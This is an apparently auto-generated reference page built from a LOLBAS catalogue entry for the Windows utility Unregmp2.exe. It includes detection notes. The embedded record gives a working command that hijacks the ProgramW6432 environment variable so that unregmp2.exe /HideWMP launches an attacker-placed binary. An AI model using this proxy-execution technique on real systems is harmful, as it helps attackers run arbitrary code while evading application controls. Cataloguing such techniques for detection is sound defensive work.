---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Unregmp2.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `unregmp2.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Unregmp2.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Unregmp2.exe](../../tools/windows/unregmp2.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | unregmp2.exe |
| name | Unregmp2.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/notwhickey/status/1466588365336293385 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@notwhickey'
  Person: Wade Hickey
Author: Wade Hickey
Commands:
- Category: Execute
  Command: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe
    "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe
    /HideWMP"
  Description: Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment
    variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn
    a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Proxy execution of binary
Created: 2021-12-06
Description: Microsoft Windows Media Player Setup Utility
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml
- IOC: Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes of `unregmp2.exe /HideWMP`
Full_Path:
- Path: C:\Windows\System32\unregmp2.exe
- Path: C:\Windows\SysWOW64\unregmp2.exe
Name: Unregmp2.exe
Resources:
- Link: https://twitter.com/notwhickey/status/1466588365336293385
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Unregmp2.yml
```

## Detection / Analysis Notes

```text
IOC: Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes of `unregmp2.exe /HideWMP`
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml
- IOC: Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes of `unregmp2.exe /HideWMP`
```
